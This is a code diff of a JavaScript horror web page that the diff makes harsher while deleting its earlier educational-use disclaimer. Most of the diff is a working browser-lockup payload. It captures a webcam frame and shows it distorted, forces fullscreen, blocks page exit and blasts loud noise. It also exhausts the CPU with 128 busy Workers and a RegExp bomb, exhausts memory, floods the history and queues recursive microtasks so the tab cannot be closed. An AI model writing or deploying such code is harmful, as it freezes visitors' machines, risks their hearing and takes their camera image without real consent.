@@ -1,7 +1,6 @@
-/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
-   STATUS: ABSOLUTE ZERO (HARD FREEZE ENABLED)
-   WARNING: This script is designed to make the browser unresponsive. 
-   Use only in controlled educational/ARG environments.
+/* PROJECT: RYUGYONG-26 / ABSOLUTE DEADLOCK
+   STATUS: SYSTEM HIJACK ENABLED
+   WARNING: THIS WILL REQUIRE TASK MANAGER (WIN) OR FORCE QUIT (MAC) TO TERMINATE.
 */
 
 let posX = -1000, posY = -1000;
@@ -22,11 +21,11 @@ async function setupCamera() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         videoStream = stream;
     } catch (err) {
-        console.log("Soul access denied - but the hunt continues.");
+        console.log("Access denied. The void will be empty.");
     }
 }
 
-// 2. 跨平台音頻啟動
+// 2. 音頻系統 (Glitch -> White Noise Bomb)
 function startCreepyVoice() {
     if (audioStarted) return;
     const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -39,10 +38,12 @@ function startCreepyVoice() {
         const output = e.outputBuffer.getChannelData(0);
         for (let i = 0; i < output.length; i++) {
             if (systemCrashed) {
-                output[i] = (Math.random() * 2 - 1) * 0.98; // 崩潰後的爆音
+                // 崩潰後：極大聲隨機噪音
+                output[i] = (Math.random() * 2 - 1) * 0.98;
             } else {
-                let g = (t & (t >> 8)) ? 0.08 : -0.08;
-                output[i] = (Math.random() * 0.1) + g;
+                // 崩潰前：數位呼吸聲
+                let g = (t & (t >> 8)) ? 0.05 : -0.05;
+                output[i] = (Math.random() * 0.05) + g;
             }
             t++;
         }
@@ -62,11 +63,18 @@ setTimeout(() => {
     else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
     else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }
 
-    glitchBlock.style.cssText = `position:fixed; width:40px; height:40px; background:white; z-index:10001; left:${startX}px; top:${startY}px; box-shadow:0 0 40px 10px white; transition:transform 0.05s linear; pointer-events:none;`;
+    glitchBlock.style.cssText = `
+        position: fixed; width: 40px; height: 40px;
+        background: white; z-index: 10001;
+        left: ${startX}px; top: ${startY}px;
+        box-shadow: 0 0 40px 10px white;
+        transition: transform 0.05s linear;
+        pointer-events: none;
+    `;
     document.body.appendChild(glitchBlock);
 
     let currentX = startX, currentY = startY;
-    const speed = 4.5; 
+    const speed = 4.8; 
 
     const hunterInterval = setInterval(() => {
         if (systemCrashed) { clearInterval(hunterInterval); return; }
@@ -87,9 +95,9 @@ setTimeout(() => {
             glitchBlock.style.transform = `scale(${scale})`;
         }
     }, 16);
-}, 25000); // 25秒後開始獵殺
+}, 25000); 
 
-// 4. 攝像頭奪魂與扭曲 (Distortion)
+// 4. 攝像頭奪魂 (Distortion)
 function captureAndDistort() {
     if (!videoStream) return;
     const canvas = document.createElement('canvas');
@@ -100,7 +108,7 @@ function captureAndDistort() {
     setTimeout(() => {
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
         const ctx = canvas.getContext('2d');
-        ctx.filter = 'grayscale(100%) contrast(800%) brightness(30%)';
+        ctx.filter = 'grayscale(100%) contrast(1000%) brightness(25%) invert(5%)';
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const dataUrl = canvas.toDataURL('image/jpeg');
@@ -108,72 +116,74 @@ function captureAndDistort() {
         if (ds) {
             ds.style.backgroundImage = `url(${dataUrl})`;
             ds.style.backgroundSize = 'cover';
-            ds.style.backgroundBlendMode = 'hard-light';
         }
         videoStream.getTracks().forEach(t => t.stop());
     }, 50);
 }
 
-// 5. 核心：絕對零度封鎖 (The Absolute Freeze)
+// 5. 核心：Roblox 級別死鎖 (Absolute Deadlock)
 function triggerFinalCrash() {
     if (systemCrashed) return;
     systemCrashed = true;
 
-    // A. 顯示死機畫面 (HELP ME)
+    // A. 立即切換 UI (視覺先行)
     document.body.innerHTML = `
         <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
             <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red; margin:0;">HELP ME.</h1>
         </div>
     `;
 
-    // B. 影相
+    // B. 執行拍照
     captureAndDistort();
 
-    // C. 請求全屏
+    // C. 請求全屏 (隱藏瀏覽器 UI)
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
     else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-    window.onbeforeunload = () => "    .     ";
+    // D. 攔截所有退出動作
+    window.onbeforeunload = () => "I AM INSIDE.";
 
-    // D. 執行死鎖
+    // E. 啟動毀滅循環
     setTimeout(() => {
-        // 1. 音頻過載
+        // 1. 音頻過載炸彈
         const ac = new (window.AudioContext || window.webkitAudioContext)();
         setInterval(() => {
             let o = ac.createOscillator();
-            o.type = 'sawtooth'; o.frequency.value = Math.random() * 5000;
+            o.type = 'sawtooth'; o.frequency.value = 50 + Math.random() * 7000;
             o.connect(ac.destination); o.start();
-        }, 20);
+        }, 25);
 
-        // 2. 硬件壓力 (128 Workers)
+        // 2. 硬件佔用 (128 Workers)
         const b = new Blob([`while(true){postMessage(0)}`], {type:'text/javascript'});
         const u = URL.createObjectURL(b);
         for(let i=0; i<128; i++) new Worker(u);
 
-        // 3. 邏輯死鎖：RegExp 炸彈 + 同步阻塞
+        // 3. 核心死鎖：RegExp 炸彈 + 同步阻塞 (Roblox 模式)
         const vault = [];
-        function lock() {
+        function deadlock() {
+            // 正則表達式災難性回溯 - 鎖死 CPU
             const bomb = /^(a+)+$/;
-            const target = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; 
-            target.match(bomb); // CPU 指數級運算 (同步阻塞)
+            bomb.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); 
 
-            for(let i=0; i<100; i++) {
-                vault.push(new BigUint64Array(1024 * 1024)); // 食 RAM
+            // 劫持歷史紀錄與消耗內存
+            for(let i=0; i<50; i++) {
+                vault.push(new BigUint64Array(1024 * 1024)); 
                 window.history.pushState(null, null, "#" + Math.random());
             }
 
-            const s = Date.now();
-            while(Date.now() - s < 2000) { Math.atan2(Math.random(), 1); } // 強制同步鎖死 2 秒
+            // 同步死循環：強制鎖死主線程 3 秒，不讓系統處理關閉事件
+            const start = Date.now();
+            while(Date.now() - start < 3000) { Math.sqrt(Math.random()); } 
 
-            Promise.resolve().then(lock); // 微任務插隊
-            setTimeout(lock, 0);
+            // 遞迴微任務隊列：插隊所有 UI 操作 (使 X 掣失靈)
+            Promise.resolve().then(deadlock);
         }
-        lock();
+        deadlock();
     }, 100);
 }
 
-// 6. 控制與觸摸
+// 6. 交互邏輯
 window.addEventListener('mousemove', (e) => {
     mouseX = e.clientX; mouseY = e.clientY;
     if (isLightOn && !systemCrashed) {
